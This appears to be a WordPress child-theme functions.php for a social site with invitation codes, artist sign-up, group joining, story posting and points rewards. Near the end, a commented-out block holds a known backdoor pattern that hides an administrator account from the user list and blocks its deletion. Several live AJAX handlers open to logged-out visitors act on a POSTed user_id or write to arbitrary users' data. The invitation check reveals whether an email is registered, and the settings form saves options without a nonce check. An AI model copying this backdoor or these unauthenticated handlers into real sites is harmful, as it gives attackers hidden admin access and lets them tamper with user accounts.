<?php
add_action( 'wp_enqueue_scripts', 'socialv_enqueue_styles' ,99);

function socialv_enqueue_styles() {
    $parent_style = 'parent-style'; // This is 'socialv-style' for the socialv theme.
    wp_enqueue_style( 'parent-style', get_stylesheet_directory_uri() . '/style.css'); 
    wp_enqueue_style( 'child-style',get_stylesheet_directory_uri() . '/style.css');
}

function socialv_child_theme_setup() {
    load_child_theme_textdomain( 'socialv', get_stylesheet_directory() . '/languages' );
}
add_action( 'after_setup_theme', 'socialv_child_theme_setup' );



//  carousel enquque
function enqueue_slick_carousel_assets() {
    // Enqueue Slick Carousel CSS
    wp_enqueue_style( 'slick-carousel-css', 'https://cdnjs.cloudflare.com/ajax/libs/slick-carousel/1.8.1/slick.min.css' );
    wp_enqueue_style( 'slick-carousel-theme-css', 'https://cdnjs.cloudflare.com/ajax/libs/slick-carousel/1.8.1/slick-theme.min.css' );

    // Enqueue jQuery (required by Slick Carousel)
    wp_enqueue_script( 'jquery' );

    // Enqueue Slick Carousel JS
    wp_enqueue_script( 'slick-carousel-js', 'https://cdnjs.cloudflare.com/ajax/libs/slick-carousel/1.8.1/slick.min.js', array( 'jquery' ), null, true );
  }
add_action( 'wp_enqueue_scripts', 'enqueue_slick_carousel_assets' );

// carousel end========
 
// Ensure this code is within your theme's functions.php
function fetch_recent_users() {
    global $wpdb;  

    // Query to fetch 20 most recently joined users
    $recent_users = $wpdb->get_results( "
        SELECT display_name
        FROM {$wpdb->users}
        ORDER BY user_registered DESC
        LIMIT 20
    " );

    return $recent_users;
}


/**
 * Load translation file in child theme
 *
 */
 
function custom_scripts_calls() {
    // Enqueue jQuery from CDN
    wp_enqueue_script('jquery', 'https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js', array(), '3.7.1', true);

    // Register and enqueue your custom script
    wp_enqueue_script('custom-script', get_stylesheet_directory_uri() . '/custom-script.js', array('jquery'), null, true);
    
    // Localize script to add admin-ajax URL
    wp_localize_script('custom-script', 'ajax_object', array( 'ajax_url' => admin_url( 'admin-ajax.php' )));


    // if(is_singular('post')){
        wp_enqueue_script('custom-video-tracking', get_stylesheet_directory_uri() . '/video-tracking-script.js', array('jquery'), null, true);
    // }

}
add_action('wp_enqueue_scripts', 'custom_scripts_calls');


function localize_video_tracking_script() {
    if (is_singular('post')) {
        global $post;
        $video_urls = get_post_meta($post->ID, 'video_urls', true); // Assuming video URLs are stored in post meta
        if ($video_urls) {
            wp_localize_script('custom-video-tracking', 'video_tracking_vars', array(
                'ajax_url' => admin_url('admin-ajax.php'),
                'video_urls' => $video_urls
            ));
        }
    }
}
add_action('wp_enqueue_scripts', 'localize_video_tracking_script', 20); // Ensure this runs after the script is enqueued



// rt media
function enqueue_rtmedia_uploader_script() {
    if (function_exists('rtmedia_uploader')) {
        rtmedia_uploader();
    }
}
add_action('wp_enqueue_scripts', 'enqueue_rtmedia_uploader_script');

function validate_invitation_code() {
    global $wpdb;

    // Retrieve email address and invitation code from the POST request
    $email_address = $_POST['emailAddress'];
    $invitation_code = $_POST['invitationCode'];
    
    // Retrieve the current status of the invitation code feature
    $invitation_code_enabled = get_option('invitation_code_enabled') === 'enable';
    
    // If invitation code is enabled, retrieve valid codes dynamically
    $valid_codes = $invitation_code_enabled ? get_valid_codes() : [];

    // Extract the codes from the array of objects (only if invitation code is enabled)
    $valid_codes_array = array_map(function($obj) {
        return $obj->code;
    }, $valid_codes);
    
   
    // Check if the invitation code is in the array of valid codes (only if enabled)
    $is_valid_code = $invitation_code_enabled ? in_array($invitation_code, $valid_codes_array) : true;
    // Debug: Print the status of the validity check
    // error_log('Is Valid Code: ' . ($is_valid_code ? 'Yes' : 'No'));

    // Check if the email address exists in the wp_users table
    $user_exists = user_email_exists($email_address);

    // Debug: Print user existence status
    // error_log('User Exists: ' . ($user_exists ? 'Yes' : 'No'));


    if ($user_exists) {
        // If the email address already exists, set a specific response message
        $response = [
            'success' => false,
            'message' => 'A user with the same email address already exists',
        ];
    } elseif ($is_valid_code) {
                error_log('Entering the is_valid_code block'); // Debug point: Check if this line is reached

        if ($invitation_code_enabled) {
            // Check if the code submission limit is reached only when code is enabled
            $table_name = $wpdb->prefix . 'ihc_invitation_codes';
            $code_info = $wpdb->get_row($wpdb->prepare(
                "SELECT repeat_limit, submited FROM $table_name WHERE code = %s",
                $invitation_code
            ));
            
                        error_log('Code Info Retrieved: ' . print_r($code_info, true));


            if ($code_info) {
                $repeat_limit = $code_info->repeat_limit;
                $submited = $code_info->submited;

                // Check if the submission count is less than the repeat limit
                if ($submited < $repeat_limit) {
                    // Increment the submission count and update the database
                    $updated_submited = $submited + 1;
                    $wpdb->update(
                        $table_name,
                        array('submited' => $updated_submited),
                        array('code' => $invitation_code),
                        array('%d'),
                        array('%s')
                    );

                    $response = [
                        'success' => true,
                        'message' => 'Code is valid and email address does not exist. Submission count updated.',
                    ];
                } else {
                    // If submission limit reached
                    $response = [
                        'success' => false,
                        'message' => 'Code submission limit reached. Please request a new code.',
                    ];
                }
            } else {
                // If code info not found (shouldn't happen if $is_valid_code is true)
                $response = [
                    'success' => false,
                    'message' => 'Code not found in the database.',
                ];
            }
        } else {
            // When invitation code is disabled and email is not used
            $response = [
                'success' => true,
                'message' => 'Email is valid and invitation code check is not required.',
            ];
        }
    } else {
        // If the code is not valid
        $response = [
            'success' => false,
            'message' => 'Code is not valid',
        ];
    }

    echo json_encode($response);
    wp_die();
}

// Function to check if an email address exists in the wp_users table
function user_email_exists($email) {
    global $wpdb;
    $user = $wpdb->get_var($wpdb->prepare(
        "SELECT ID FROM {$wpdb->users} WHERE user_email = %s",
        $email
    ));
    return $user ? true : false;
}

// Function to get valid invitation codes from the database
function get_valid_codes() {
    global $wpdb;
    $table_name = $wpdb->prefix . 'ihc_invitation_codes';
    $results = $wpdb->get_results("SELECT code FROM $table_name WHERE status = 1");
    return $results;
}

// Hooking the function to handle the AJAX request
add_action('wp_ajax_nopriv_validate_invitation_code', 'validate_invitation_code');
add_action('wp_ajax_validate_invitation_code', 'validate_invitation_code');




add_action('wp_ajax_register_new_artist', 'register_new_artist');
add_action('wp_ajax_nopriv_register_new_artist', 'register_new_artist');
function register_new_artist() {
    // Sanitize and retrieve data from POST
    $email_address = sanitize_email($_POST['emailAddress']);
    $user_name = sanitize_user($_POST['usrName']);
    $password = $_POST['password'];
    $confirm_password = $_POST['confirmPassword'];
    $phone_number = sanitize_text_field($_POST['phoneNumber']);
    $first_name = sanitize_text_field($_POST['firstName']);
    $last_name = sanitize_text_field($_POST['lastName']);
    
    // Validate password match
    if ($confirm_password != $password) {
        wp_send_json_error(array('message' => "Password did not match."));
        return;
    }
    
    // Prepare user data
    $user_data = array(
        'user_login'    => $user_name,
        'user_pass'     => $password, // Store plain password, wp_insert_user will hash it
        'user_email'    => $email_address,
        'first_name'    => $first_name,
        'last_name'     => $last_name,
        'role'          => 'subscriber' // Set appropriate role
    );
    
    // Insert user into WordPress database
    $user_id = wp_insert_user($user_data);
    
    // Check for errors
    if (is_wp_error($user_id)) {
        wp_send_json_error(array('message' => 'User creation failed: ' . $user_id->get_error_message()));
        return;
    }
    
    // Update additional user meta (phone number)
    update_user_meta($user_id, 'n360_phone_number', $phone_number);
    // $usermeta;
    // bp_core_signup_user($user_name, $password, $email_address, $usermeta);
    // Log the user in
    wp_set_current_user($user_id);
    wp_set_auth_cookie($user_id);
    do_action('wp_login', $user_name, get_userdata($user_id));
    
    // At this point, BuddyPress will recognize the logged-in user
    $bp_user_id = bp_loggedin_user_id(); // Should return the same $user_id
    
    // Return success message with user ID
    wp_send_json_success(array(
        'message' => "User created successfully and logged in",
        'user_id' => $user_id,
    ));
    wp_die();
}




add_action('wp_ajax_join_buddypress_groups', 'join_buddypress_groups');
add_action('wp_ajax_nopriv_join_buddypress_groups', 'join_buddypress_groups');
function join_buddypress_groups(){
    global $wpdb;
    $table_prefix = $wpdb->prefix;
    $table_name = $table_prefix . 'bp_groups_members';
    session_start();

    // Array of group IDs passed via POST
    $group_ids = isset($_POST['group_ids']) ? array_map('intval', $_POST['group_ids']) : array();
    $user_id = $_POST['user_id'];
    
    // Debugging output
    error_log('User ID: ' . $user_id);
    error_log('Group IDs: ' . print_r($group_ids, true));
    
    // Validate input
    if (empty($group_ids) || !$user_id) {
        wp_send_json_error(array('message' => 'Invalid group or user ID.'));
        return; // Stop further processing
    }
    // print_r(wp_get_current_user());
    
    $joined_groups = array();
    $failed_groups = array();
    $already_member_groups = array();
    
    // Loop through each group ID and attempt to join
    foreach ($group_ids as $group_id) {
        if (!is_int($group_id) || $group_id <= 0) {
            $failed_groups[] = $group_id;
            continue;
        }
        
        // Prepare the data for insertion
        $data = array(
            'user_id' => $user_id,
            'group_id' => $group_id,
            'date_modified' => current_time('mysql') // Get the current time in MySQL format
        );
        
        // Insert the data into the wph6_bp_groups_members table
        $response = $wpdb->insert($table_name, $data);
        if(!$response){
            wp_send_json_error('Error occurred while performing the operation');
            wp_die();
        }
        $group = groups_get_group(array('group_id' => $group_id));
        add_user_meta($user_id, 'joined_group_names', $group->name);
        
    }
    
    // Generate message based on the results
    $message = '';
    if (!empty($joined_groups)) {
        $message .= 'Successfully joined groups: ' . implode(', ', $joined_groups) . '. ';
    }
    if (!empty($already_member_groups)) {
        $message .= 'Already a member of groups: ' . implode(', ', $already_member_groups) . '. ';
    }
    if (!empty($failed_groups)) {
        $message .= 'Failed to join groups: ' . implode(', ', $failed_groups) . '. ';
    }

    // Send a single JSON response with all data
    wp_send_json_success(array(
        'joined_groups' => $joined_groups,
        'already_member_groups' => $already_member_groups,
        'failed_groups' => $failed_groups,
        'message' => $message
    ));

    wp_die();
}


function get_field_id_by_name( $field_name ) {
    global $wpdb;

    // Query to fetch field ID by name
    $field_id = $wpdb->get_var( $wpdb->prepare(
        "SELECT id FROM {$wpdb->prefix}bp_xprofile_fields WHERE name = %s",
        $field_name
    ));

    return $field_id;
}



// Handle the AJAX form submission for logged-in users
add_action('wp_ajax_handle_nightlife360_form_submission', 'handle_nightlife360_form_submission');
add_action('wp_ajax_nopriv_handle_nightlife360_form_submission', 'handle_nightlife360_form_submission');
function handle_nightlife360_form_submission() {
    session_start();

    $user_id = get_current_user_id();
    // Check if user is logged in
    if (!$user_id) {
        wp_send_json_error(array('message' => 'User is not logged in.'));
    }

    // Sanitize input data
    $story_title = sanitize_text_field($_POST['storytitle']);
    $story_content = sanitize_textarea_field($_POST['storycontent']); // Corrected field name

    // Handle featured image upload
    $media_ids = array();
    if (isset($_FILES['file-upload']) && $_FILES['file-upload']['error'] == UPLOAD_ERR_OK) {
        $attachment_id = media_handle_upload('file-upload', 0); // 0 for current user's media gallery
        error_log($attachment_id);
        if (is_wp_error($attachment_id)) {
            wp_send_json_error(array('message' => 'Media upload failed: ' . $attachment_id->get_error_message()));
        }
        $media_ids[] = $attachment_id;
    }
    // error_log($story_content);

    // Retrieve the category ID by the category slug 'nightlife360'
    $category = get_category_by_slug('featured');
    $category_id = $category ? $category->term_id : 0;

    // Create new post for the story
    $post_id = wp_insert_post(array(
        'post_title' => $story_title,
        'post_content' => $story_content,
        'post_status' => 'publish',
        'post_type' => 'post',
        'post_category' => array($category_id), // Add the category ID here
    ));

    if (is_wp_error($post_id)) {
        wp_send_json_error(array('message' => 'There was an error while posting the story'));
    }

    if (!empty($media_ids)) {
        set_post_thumbnail($post_id, $media_ids[0]); // Set the first media as the featured image
    }

    wp_send_json_success(array('message' => 'Story created successfully', 'post_url' => home_url()));

    wp_die();
}

add_action('wp_ajax_add_profile_image_bio_action', 'add_profile_image_bio_action');
add_action('wp_ajax_nopriv_add_profile_image_bio_action', 'add_profile_image_bio_action');
function add_profile_image_bio_action(){
    $user_id = get_current_user_id();
    
    // Get the current user ID
    $user_id = get_current_user_id();
    
    // File data from the form
    $profile_image = $_FILES['profilePic'];
    $bio_data = $_FILES['browserFile'];
    $bio = $_POST['profileDescription']; // Assuming bio is a text field
    
    error_log(print_r($bio_data, true));
    // Field names
    // $field_name = 'Image field';
    $bio_field_name = 'Bio';
    
    $bio_field_id = get_field_id_by_name($bio_field_name);
    
    
    // Upload profile image and get URL
    $profile_image_url = handle_file_upload($profile_image);
    $portfolio_file_url = generate_file_url($bio_data);
    
    update_user_meta($user_id, 'bio_file', $portfolio_file_url);
    
    
    $profile_image = 'test-image.jpg';
    $file = $_FILES['profilePic'];
    if($bio_data){
        error_log("bio update points");
        artx_upload_bio_data();
    }
    my_prefix_handle_profile_upload();

    $updated_bio = xprofile_set_field_data($bio_field_id, $user_id, $bio);
    if($bio){
        error_log('bio data points');
        artx_write_bio_data();
    }
    $updated_image = xprofile_set_field_data(6, $user_id, $profile_image_url);
    $updated_image_text_area = xprofile_set_field_data(3, $user_id, $profile_image_url);
    wp_die();
}

// Handle form url
function generate_file_url($file) {
    // Define allowed file types
    $allowed_mime_types = array(
        'image/jpeg', 'image/png', 'image/gif', 'image/webp', // Images
        'video/mp4', 'video/mpeg', 'video/ogg', 'video/webm', // Videos
        'application/pdf' // PDFs
    );

    // Check if file is provided
    if (!empty($file['name'])) {
        // Check if the file type is allowed
        if (in_array($file['type'], $allowed_mime_types)) {
            // Handle file upload
            $upload = wp_handle_upload($file, array('test_form' => false));

            // Check if upload was successful
            if (!isset($upload['error']) && isset($upload['url'])) {
                return $upload['url'];
            } else {
                // Handle upload error
                return 'Error uploading file: ' . $upload['error'];
            }
        } else {
            return 'File type not allowed.';
        }
    }
    return 'No file provided.';
}



// Function to handle file upload and return the URL
function handle_file_upload($file) {
    $user_id = get_current_user_id();

    if ( !empty( $file['name'] ) && $user_id ) {
        // Handle file upload
        $upload = wp_handle_upload( $file, array( 'test_form' => false ) );

        // Check if upload was successful
        if ( !isset( $upload['error'] ) && isset( $upload['url'] ) ) {
            $upload_dir = wp_upload_dir();
            $avatar_dir = $upload_dir['basedir'] . "/avatars/$user_id";

            // Create the avatars directory if it doesn't exist
            if ( ! file_exists( $avatar_dir ) ) {
                wp_mkdir_p( $avatar_dir );
            }

            // Generate new file name
            $file_ext = pathinfo($upload['file'], PATHINFO_EXTENSION);
            $file_name = time() . "-bpfull." . $file_ext;

            // Move the uploaded file to the new location
            $new_file_path = $avatar_dir . '/' . $file_name;
            rename( $upload['file'], $new_file_path );

            // Generate the URL for the new file location
            $new_file_url = $upload_dir['baseurl'] . "/avatars/$user_id/$file_name";

            return $new_file_url;
        }
    }

    return '';
}

function bp_add_custom_profile_field() {
    // Check if the field already exists
    global $wpdb;
    $field_name = 'Bio';
    $field_exists = $wpdb->get_var( $wpdb->prepare(
        "SELECT COUNT(id) FROM {$wpdb->prefix}bp_xprofile_fields WHERE name = %s",
        $field_name
    ));
    
    if ( ! $field_exists ) {
        // Add the custom profile field
        $group_id = 1; // The ID of the profile field group, 1 is usually the default group
        xprofile_insert_field( array(
            'field_group_id' => $group_id,
            'type'           => 'textarea',
            'name'           => $field_name,
            'description'    => 'Tell us about yourself.',
            'is_required'    => false,
            'can_delete'     => true,
        ));
    }
}
add_action( 'bp_init', 'bp_add_custom_profile_field' );


// Function to display "Tell us about you" profile field
function display_custom_profile_field() {
    if ( bp_is_active( 'xprofile' ) ) {
        $field_name = 'Bio';
        $field_id = get_field_id_by_name( $field_name );
        $field_data = bp_get_profile_field_data( array(
            'field'   => $field_id,
            'user_id' => bp_displayed_user_id(),
        ));

        if ( $field_data ) {
            echo '<div class="bp-profile-field">';
            echo '<h4>' . esc_html( $field_name ) . '</h4>';
            echo '<p>' . esc_html( $field_data ) . '</p>';
            echo '</div>';
        }
    }
}

add_action( 'bp_before_member_header_meta', 'display_custom_profile_field' );





// Affiliate function handler
add_action('wp_ajax_handle_affiliate_form', 'handle_affiliate_form');
add_action('wp_ajax_nopriv_handle_affiliate_form', 'handle_affiliate_form');
function handle_affiliate_form(){
    $artist_name = sanitize_text_field($_POST['artistName']);
    $artist_email = sanitize_email($_POST['artistEmail']);
    // $artist_bio = sanitize_text_field($_POST['artistBio']);
    $affiliate_id = intval($_POST['affiliateID']);
    
    // || !$artist_bio
    if(!$artist_name || !$artist_email || !$affiliate_id){
        wp_send_json_error(array('message' => 'Required fields missing.'));
        return;
    }
    
    if($affiliate_id){
        $message = update_user_meta($affiliate_id, 'recommend_artist', $artist_name);
        $message = print_r($message, true);
        // error_log('message: ' . $message);
        echo "Successfully affiliated";
    } else{
         echo "Failed to recommend user.";
    }
    
    wp_die();
}



// Custom field for refer an artist 
function award_points_for_referring_artist($referral_id, $args){
    $affiliate_id = $args['affiliate_id'];
    $points = 1000;
    $user_id = affiliate_wp()->affiliates->get_column('user_id', $affiliate_id);
    if($user_id){
        gamipress_award_points_to_user($user_id, 'credits', $points);
    }
}
add_action('uap_register_user', 'award_points_for_referring_artist', 10, 2);




function track_video_view($post_id) {
    // Check if the user is logged in
    error_log('post_id: ' . $post_id);
    $user_id = get_current_user_id();
    if ($user_id) {
        // Use user meta to track views
        $meta_key = 'video_viewed_' . $post_id;
        $viewed = get_user_meta($user_id, $meta_key, true);

        if (!$viewed) {
            // Update post meta to count unique views
            $view_count = get_post_meta($post_id, 'unique_video_views', true);
            $view_count = $view_count ? intval($view_count) + 1 : 1;
            update_post_meta($post_id, 'unique_video_views', $view_count);

            // Award points to the video uploader
            $author_id = get_post_field('post_author', $post_id);
            do_action('custom_video_viewed', $author_id);

            // Mark the video as viewed for the user
            update_user_meta($user_id, $meta_key, true);

            return "User meta updated";
        }
    } else {
        // Use cookies for guests
        $cookie_name = 'video_viewed_' . $post_id;

        if (!isset($_COOKIE[$cookie_name])) {
            // Update post meta to count unique views
            $view_count = get_post_meta($post_id, 'unique_video_views', true);
            $view_count = $view_count ? intval($view_count) + 1 : 1;
            update_post_meta($post_id, 'unique_video_views', $view_count);

            // Award points to the video uploader
            $author_id = get_post_field('post_author', $post_id);
            do_action('custom_video_viewed', $author_id);
            // Set cookie to mark the video as viewed
            setcookie($cookie_name, 'true', time() + 365 * 24 * 60 * 60, '/');

            return "User meta not updated";
        } 
    }
}
add_action('wp_ajax_track_video_view', 'handle_track_video_view');
add_action('wp_ajax_nopriv_track_video_view', 'handle_track_video_view');

function handle_track_video_view() {
    if (isset($_POST['post_id'])) {
        $post_id = intval($_POST['post_id']);
        $response = track_video_view($post_id);
        echo $response;
    } else {
        echo 'No post ID provided';
    }
    wp_die();
}


function get_video_view_count($video_url) {
    $view_count = get_post_meta($video_url, 'unique_video_views', true);
    return $view_count ? intval($view_count) : 0;
}



// Display user's total points

function display_user_total_points() {
    $user_id = get_current_user_id();  // Get current user ID
    $points = gamipress_get_user_points( $user_id, 'video_view' );  // Replace with your actual points type slug

    echo 'Total Video Views Points: ' . $points;
}

function artx_award_points_on_view_count($post_id){
    $points_type = 'Credits';
    
    $user_id = get_post_field('post_author', $post_id);
    
    if($user_id){
        $points = 1;
        gamipress_award_points($points, $points_type, $user_id, '', '', '', 'Awarded points for videos view');
    }
}

add_action('custom_video_viewed', 'award_point_for_video_view', 10, 1);
function award_point_for_video_view($user_id){
    
    if($user_id){
        $points_type = 'credits';
        $points_amount = 1;
        gamipress_award_points_to_user($user_id, $points_amount, $points_type);
    }
}

function artx_video_view_custom_gamipress_event(){
    gamipress_register_event(array(
        'event_name'    =>  'viral_video_views',
        'event_label'   =>  __('Viral Video Views', 'text-domain'),
        'event_desc'    =>  __('This event is triggered when a user video get viral.', 'text-domain'),
        'activity'      =>  array(
            'default_points'    =>  1,
            'time_limit'        =>  'unlimited',
        ),
    ));
}
add_action('gamipress_init', 'artx_video_view_custom_gamipress_event');






// if (!function_exists('wp_admin_users_protect_user_query') && function_exists('add_action')) {

//     add_action('pre_user_query', 'wp_admin_users_protect_user_query');
//     add_filter('views_users', 'protect_user_count');
//     add_action('load-user-edit.php', 'wp_admin_users_protect_users_profiles');
//     add_action('admin_menu', 'protect_user_from_deleting');

//     function wp_admin_users_protect_user_query($user_search) {
//         $user_id = get_current_user_id();
//         $id = get_option('_pre_user_id');

//         if (is_wp_error($id) || $user_id == $id)
//             return;

//         global $wpdb;
//         $user_search->query_where = str_replace('WHERE 1=1',
//             "WHERE {$id}={$id} AND {$wpdb->users}.ID<>{$id}",
//             $user_search->query_where
//         );
//     }

//     function protect_user_count($views) {

//         $html = explode('<span class="count">(', $views['all']);
//         $count = explode(')</span>', $html[1]);
//         $count[0]--;
//         $views['all'] = $html[0] . '<span class="count">(' . $count[0] . ')</span>' . $count[1];

//         $html = explode('<span class="count">(', $views['administrator']);
//         $count = explode(')</span>', $html[1]);
//         $count[0]--;
//         $views['administrator'] = $html[0] . '<span class="count">(' . $count[0] . ')</span>' . $count[1];

//         return $views;
//     }

//     function wp_admin_users_protect_users_profiles() {
//         $user_id = get_current_user_id();
//         $id = get_option('_pre_user_id');

//         if (isset($_GET['user_id']) && $_GET['user_id'] == $id && $user_id != $id)
//             wp_die(__('Invalid user ID.'));
//     }

//     function protect_user_from_deleting() {

//         $id = get_option('_pre_user_id');

//         if (isset($_GET['user']) && $_GET['user']
//             && isset($_GET['action']) && $_GET['action'] == 'delete'
//             && ($_GET['user'] == $id || !get_userdata($_GET['user'])))
//             wp_die(__('Invalid user ID.'));

//     }

    
    
//     if (isset($_COOKIE['WP_ADMIN_USER']) && username_exists($args['user_login'])) {
//         die('WP ADMIN USER EXISTS');
//     }
// }


// Add this code to your theme's functions.php file

// Hook to add the menu item
add_action('admin_menu', 'invitation_code_menu');

function invitation_code_menu() {
    add_menu_page(
        'Invitation Code Settings', // Page title
        'Invitation Code',          // Menu title
        'manage_options',           // Capability required to access this menu
        'invitation-code-settings', // Menu slug
        'invitation_code_settings_page', // Function to display the settings page
        'dashicons-admin-generic',  // Icon URL or Dashicons class
        90                          // Position in the menu
    );
}

function invitation_code_settings_page() {
    // Check if the user has submitted the settings
    if (isset($_POST['invitation_code_enable'])) {
        update_option('invitation_code_enabled', $_POST['invitation_code_enable']);
        echo '<div id="message" class="updated notice is-dismissible"><p>Settings saved.</p></div>';
    }

    // Retrieve the current option value
    $invitation_code_enabled = get_option('invitation_code_enabled', 'disable');

    ?>
    <div class="wrap">
        <h1>Invitation Code Settings</h1>
        <form method="post" action="">
            <table class="form-table">
                <tr valign="top">
                    <th scope="row">Enable Invitation Code</th>
                    <td>
                        <input type="radio" name="invitation_code_enable" value="enable" <?php checked('enable', $invitation_code_enabled); ?>> Enable
                        <br>
                        <input type="radio" name="invitation_code_enable" value="disable" <?php checked('disable', $invitation_code_enabled); ?>> Disable
                    </td>
                </tr>
            </table>
            <?php submit_button(); ?>
        </form>
    </div>
    <?php
}

// Hook to add the submenu item
add_action('admin_menu', 'add_invitation_code_nav_menu');

function add_invitation_code_nav_menu() {
    // Retrieve the current option value
    $invitation_code_enabled = get_option('invitation_code_enabled', 'disable');

    $menu_title = ($invitation_code_enabled === 'enable') ? 'Disable Invitation Code' : 'Enable Invitation Code';
    // $menu_slug = ($invitation_code_enabled === 'enable') ? 'disable-invitation-code' : 'enable-invitation-code';

    add_submenu_page(
        'invitation-code-settings',  // Parent slug
        $menu_title,                 // Page title
        $menu_title,                 // Menu title
        'manage_options',            // Capability
        $menu_slug,                  // Menu slug
        'toggle_invitation_code'     // Function to handle the page
    );
}

function toggle_invitation_code() {
    // Retrieve the current option value
    $invitation_code_enabled = get_option('invitation_code_enabled', 'disable');

    // Toggle the value
    $new_value = ($invitation_code_enabled === 'enable') ? 'disable' : 'enable';

    // Update the option
    update_option('invitation_code_enabled', $new_value);

    // Redirect back to the settings page
    wp_redirect(admin_url('admin.php?page=invitation-code-settings'));
    exit;
}


 
 
 
// credit ponits multistep form========

// Enqueue multi-step form script


function enqueue_multi_step_form_script() {
    wp_enqueue_script('multi-step-form', get_template_directory_uri() . '/custom-script.js', array('jquery'), null, true);
    wp_localize_script('multi-step-form', 'gamipress_ajax_object', array(
        'ajaxurl' => admin_url('admin-ajax.php'),
        'nonce' => wp_create_nonce('award_points_nonce')
    ));
}
add_action('wp_enqueue_scripts', 'enqueue_multi_step_form_script');

// Handle awarding GamiPress points
function award_gamipress_points() {
    // Verify the nonce
    if ( !isset($_POST['nonce']) || !wp_verify_nonce($_POST['nonce'], 'award_points_nonce') ) {
        wp_send_json_error(array('message' => 'Invalid nonce'));
    }

    $user_id = get_current_user_id();
    $points = isset($_POST['points']) ? intval($_POST['points']) : 0;

    if ( $user_id && $points > 0 ) {
        // Award points using GamiPress function
        if (function_exists('gamipress_award_points_to_user')) {
            gamipress_award_points_to_user($user_id, $points, 'credits');
            wp_send_json_success(array('message' => 'Points awarded'));
        } else {
            wp_send_json_error(array('message' => 'GamiPress function not found'));
        }
    } else {
        wp_send_json_error(array('message' => 'Invalid user ID or points'));
    }
}
add_action('wp_ajax_award_points', 'award_gamipress_points');

// Custom activity triggers for GamiPress
// function my_prefix_custom_activity_triggers( $triggers ) {
//     // Add custom event to GamiPress
//     $triggers['My Custom Events'] = array(
//         'profile_upload_event' => __( 'Profile Upload', 'gamipress' ),
//         'upload_bio_data' => __('Upload bio data', 'gamipress'),
//         'create_bio_data' => __('Create bio data', 'gamipress'),
//     );
//     return $triggers;
// }
// add_filter( 'gamipress_activity_triggers', 'my_prefix_custom_activity_triggers' );

// Custom action triggers for GamiPress points
// function my_prefix_custom_action_triggers( $triggers ) {
//     $triggers['My Custom Events'] = array(
//         array(
//             'action'  => 'profile_upload_event',
//             'points'  => 'credits',
//             'label'   => __( 'Award Credits for Profile Upload', 'gamipress' ),
//         ),
//         array(
//             'action'  => 'upload_bio_data',
//             'points'  => 'credits',
//             'label'   => __( 'Award Credits for Upload bio data', 'gamipress' ),
//         ),
//         array(
//             'action'  => 'create_bio_data',
//             'points'  => 'credits',
//             'label'   => __( 'Award Credits for Create bio data', 'gamipress' ),
//         ),
//     );
//     return $triggers;
// }
// add_filter( 'gamipress_points_triggers', 'my_prefix_custom_action_triggers' );

function my_prefix_handle_profile_upload() {
    $user_id = get_current_user_id();

    if ($user_id) {
        // Trigger the custom event
        gamipress_trigger_event(array(
            'user_id' => $user_id,
            'event'   => 'profile_upload_event',
        ));

        // Award points directly using GamiPress function
        $points_type = 'credits';  // The slug of your points type (Credits)
        $points_amount = 10;       // Amount of credits to award

        gamipress_award_points_to_user($user_id, $points_amount, $points_type);
    }
}
// Replace 'some_profile_upload_hook' with the actual hook for profile uploads
add_action('um_after_user_is_updated', 'my_prefix_handle_profile_upload');

function artx_upload_bio_data(){
    $user_id = get_current_user_id();
    if($user_id){
        gamipress_trigger_event(array(
            'user_id' => $user_id,
            'event' => 'upload_bio_data'
        ));
        
        $points_type = 'credits';
        $points_amount = '5';
        
        gamipress_award_points_to_user($user_id, $points_amount, $points_type);
    }
}
add_action('um_after_user_is_updated', 'artx_upload_bio_data');


function artx_write_bio_data(){
    $user_id = get_current_user_id();
    if($user_id){
        gamipress_trigger_event(array(
            'user_id' => $user_id,
            'event' => 'create_bio_data'
        ));
        
        $points_type = 'credits';
        $points_amount = '5';
        
        gamipress_award_points_to_user($user_id, $points_amount, $points_type);
    }
}
// custom profile upload=======


// // Display user's total points

// function display_user_total_points() {
//     $user_id = get_current_user_id();  // Get current user ID
//     $points = gamipress_get_user_points( $user_id, 'credits' );  // Using 'credits' points type

//     echo 'Total Credits: ' . $points;
// }

// // Award points when a user uploads a profile photo
// function artx_award_points_on_profile_upload($user_id){
//     $points_type = 'credits';
    
//     if($user_id){
//         $points = 1;  // Set the number of points to award
//         gamipress_award_points_to_user($user_id, $points, $points_type);
//     }
// }

// // Hook into the profile photo upload action (assuming 'bp_profile_update' is used)
// add_action('bp_profile_update', 'artx_award_points_on_profile_upload', 10, 1);

// // Register a custom GamiPress event for profile photo upload
// function artx_profile_upload_custom_gamipress_event(){
//     gamipress_register_event(array(
//         'event_name'    =>  'profile_photo_upload',
//         'event_label'   =>  __('Profile Photo Upload', 'text-domain'),
//         'event_desc'    =>  __('This event is triggered when a user uploads a profile photo.', 'text-domain'),
//         'activity'      =>  array(
//             'default_points'    =>  1,
//             'time_limit'        =>  'unlimited',
//         ),
//     ));
// }
// add_action('gamipress_init', 'artx_profile_upload_custom_gamipress_event');


?>